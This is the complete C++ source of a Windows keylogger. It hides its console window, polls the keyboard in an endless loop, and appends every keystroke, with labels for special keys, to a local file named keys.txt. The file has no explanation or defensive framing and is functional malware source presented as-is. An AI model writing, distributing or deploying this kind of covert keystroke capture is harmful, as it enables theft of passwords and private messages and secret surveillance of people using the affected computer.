
#include <iostream>
#include <fstream>
#include <windows.h> 
#include <winuser.h>
 
using namespace std;
 
void write (int key) {
    ofstream file;
        file.open("keys.txt", ios::app );

    if ((key == 1) || (key == 2)){
        file<<endl;
    }
    else{
        cout << key << endl;
    
        if (key == VK_BACK)
            file<<"{Backspace}";

        else if (key == VK_RETURN)
            file<<"{Enter}\n";

        else if (key == VK_SPACE)
            file<<" {Space} ";

        else if (key == VK_TAB)
            file<<" {TAB} ";

        else if (key == VK_SHIFT)
            file<<"{Shift}";
            
        else if (key == VK_CONTROL)
            file<<"{ctrl}";

        else if (key == VK_ESCAPE)
            file<<"{ESC}";
            
        else if (key == VK_DELETE)
            file<<"{Del}";
        
        else if (key == VK_NUMPAD0)
            file<<"0";

        else if (key == VK_NUMPAD1)
            file<<"1";

        else if (key == VK_NUMPAD2)
            file<<"2";

        else if (key == VK_NUMPAD3)
            file<<"3";

        else if (key == VK_NUMPAD4)
            file<<"4";

        else if (key == VK_NUMPAD5)
            file<<"5";

        else if (key == VK_NUMPAD6)
            file<<"6";
            
        else if (key == VK_NUMPAD7)
            file<<"7";

        else if (key == VK_NUMPAD8)
            file<<"8";

        else if (key == VK_NUMPAD9)
            file<<"9";

        else 
            file<<char(key);
            
        }
    file.close();
}

 
int main() {
    
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);

    char i;

    while (1) {
        for(i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767)
                write(i);
        }
    }
    system("PAUSE");
    return 0;
}